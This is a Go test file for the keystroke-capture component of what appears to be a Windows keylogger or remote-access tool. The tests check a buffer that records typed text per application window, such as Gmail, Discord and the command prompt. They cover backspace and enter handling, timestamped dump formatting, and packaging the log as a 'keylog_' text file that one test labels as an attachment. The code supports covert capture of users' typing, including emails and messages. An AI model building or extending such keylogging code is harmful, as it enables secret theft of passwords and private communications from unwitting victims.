//go:build windows

package commands

import (
	"strings"
	"testing"
	"time"
	"unicode/utf8"

	"github.com/local/govoid/internal/win32"
)

func stampAt(text string) time.Time {
	parsed, err := time.Parse("2006-01-02 15:04:05", text)
	if err != nil {
		panic(err)
	}
	return parsed.UTC()
}

func typed(text string) []win32.KeyEvent {
	events := make([]win32.KeyEvent, 0, len(text))
	for _, r := range text {
		events = append(events, win32.KeyEvent{Rune: r})
	}
	return events
}

func backspace() win32.KeyEvent {
	return win32.KeyEvent{Vk: keyBackspace, IsSpecial: true}
}

func TestDumpEsTextoPlano(t *testing.T) {
	buffer := &KeylogBuffer{}
	at := stampAt("2026-11-24 15:32:01")
	buffer.StartSession("notepad.exe", "Sin título: Bloc de notas", at)

	for _, event := range typed("hola mundo") {
		buffer.Append(event)
	}

	want := "[notepad.exe | Sin título: Bloc de notas | 2026-11-24 15:32:01 UTC]\n" +
		"hola mundo\n"
	if got := buffer.FormatDump(); got != want {
		t.Fatalf("dump distinto.\nesperado:\n%q\nobtenido:\n%q", want, got)
	}
}

func TestBackspaceBorraUltimoCaracter(t *testing.T) {
	buffer := &KeylogBuffer{}
	at := stampAt("2026-11-24 15:32:01")
	buffer.StartSession("chrome.exe", "Gmail - Inbox", at)

	for _, event := range typed("hola mundo") {
		buffer.Append(event)
	}
	for i := 0; i < 3; i++ {
		buffer.Append(backspace())
	}

	if got := buffer.FormatDump(); !strings.Contains(got, "\nhola mu\n") {
		t.Fatalf("backspace no borró:\n%s", got)
	}
	if strings.Contains(buffer.FormatDump(), "[BKSP]") {
		t.Fatal("quedó el marcador [BKSP] en el dump")
	}
}

func TestBackspaceHastaVacioOmiteBloque(t *testing.T) {
	buffer := &KeylogBuffer{}
	at := stampAt("2026-11-24 15:32:01")
	buffer.StartSession("cmd.exe", "Símbolo del sistema", at)

	buffer.Append(win32.KeyEvent{Rune: 'a'})
	buffer.Append(win32.KeyEvent{Rune: 'b'})
	buffer.Append(backspace())
	buffer.Append(backspace())
	buffer.Append(backspace())

	if got := buffer.FormatDump(); got != "" {
		t.Fatalf("un bloque vacío no debe salir: %q", got)
	}
}

func TestEnterEscribeSaltoReal(t *testing.T) {
	buffer := &KeylogBuffer{}
	at := stampAt("2026-11-24 15:32:01")
	buffer.StartSession("notepad.exe", "notas.txt", at)

	for _, event := range typed("linea uno") {
		buffer.Append(event)
	}
	buffer.Append(win32.KeyEvent{Vk: 0x0D, Rune: '\n'})
	for _, event := range typed("linea dos") {
		buffer.Append(event)
	}

	want := "[notepad.exe | notas.txt | 2026-11-24 15:32:01 UTC]\nlinea uno\nlinea dos\n"
	if got := buffer.FormatDump(); got != want {
		t.Fatalf("esperado:\n%q\nobtenido:\n%q", want, got)
	}
	if strings.Contains(buffer.FormatDump(), "[ENTER]") {
		t.Fatal("quedó el marcador [ENTER]")
	}
}

func TestSimbolosConShiftLleganTalCual(t *testing.T) {
	buffer := &KeylogBuffer{}
	at := stampAt("2026-11-24 15:32:01")
	buffer.StartSession("chrome.exe", "Formulario", at)

	for _, event := range typed("Correo: ñandú@example.com!") {
		buffer.Append(event)
	}

	if got := buffer.FormatDump(); !strings.Contains(got, "Correo: ñandú@example.com!") {
		t.Fatalf("se perdió el texto con símbolos:\n%s", got)
	}
}

func TestSeccionesPorVentanaYFormato(t *testing.T) {
	buffer := &KeylogBuffer{}
	first := stampAt("2026-11-24 15:32:01")
	buffer.StartSession("chrome.exe", "Gmail - Inbox", first)
	for _, event := range typed("hola mundo") {
		buffer.Append(event)
	}

	buffer.StartSession("explorer.exe", "Escritorio", stampAt("2026-11-24 15:33:00"))

	second := stampAt("2026-11-24 15:33:45")
	buffer.StartSession("Discord.exe", "general", second)
	for _, event := range typed("te mando el archivo") {
		buffer.Append(event)
	}

	want := "[chrome.exe | Gmail - Inbox | 2026-11-24 15:32:01 UTC]\n" +
		"hola mundo\n" +
		"\n" +
		"[Discord.exe | general | 2026-11-24 15:33:45 UTC]\n" +
		"te mando el archivo\n"

	if got := buffer.FormatDump(); got != want {
		t.Fatalf("esperado:\n%s\nobtenido:\n%s", want, got)
	}
	if !utf8.ValidString(buffer.FormatDump()) {
		t.Fatal("el dump no es UTF-8 válido")
	}
}

func TestDumpToFileNombreYMultibyte(t *testing.T) {
	buffer := &KeylogBuffer{}
	at := stampAt("2026-11-24 09:05:07")
	buffer.StartSession("notepad.exe", "無題 - メモ帳", at)
	for _, event := range typed("ñandú 日本語 ключ") {
		buffer.Append(event)
	}

	data, name := buffer.DumpToFile()
	if !strings.HasPrefix(name, "keylog_") || !strings.HasSuffix(name, ".txt") {
		t.Fatalf("nombre inesperado: %s", name)
	}
	if !utf8.Valid(data) {
		t.Fatal("los bytes del dump no son UTF-8 válido")
	}
	if !strings.Contains(string(data), "ñandú 日本語 ключ") {
		t.Fatalf("se perdió texto multibyte:\n%s", data)
	}
	t.Logf("adjunto: %s (%d bytes)", name, len(data))
}

func TestTituloConSaltoNoRompeHeader(t *testing.T) {
	buffer := &KeylogBuffer{}
	at := stampAt("2026-11-24 15:32:01")
	buffer.StartSession("chrome.exe", "Gmail\nInbox", at)
	buffer.Append(win32.KeyEvent{Rune: 'x'})

	lines := strings.Split(buffer.FormatDump(), "\n")
	if len(lines) < 2 {
		t.Fatalf("dump raro: %q", buffer.FormatDump())
	}
	if lines[0] != "[chrome.exe | Gmail Inbox | 2026-11-24 15:32:01 UTC]" {
		t.Fatalf("header partido: %q", lines[0])
	}
}

func TestClearBufferDejaVacio(t *testing.T) {
	buffer := &KeylogBuffer{}
	at := stampAt("2026-11-24 10:00:00")
	buffer.StartSession("cmd.exe", "Símbolo del sistema", at)
	buffer.Append(win32.KeyEvent{Rune: 'a'})

	buffer.ClearBuffer()

	if got := buffer.FormatDump(); got != "" {
		t.Fatalf("el dump no quedó vacío: %q", got)
	}
	if n := buffer.sessionCount(); n != 0 {
		t.Fatalf("quedaron %d sesiones", n)
	}
}
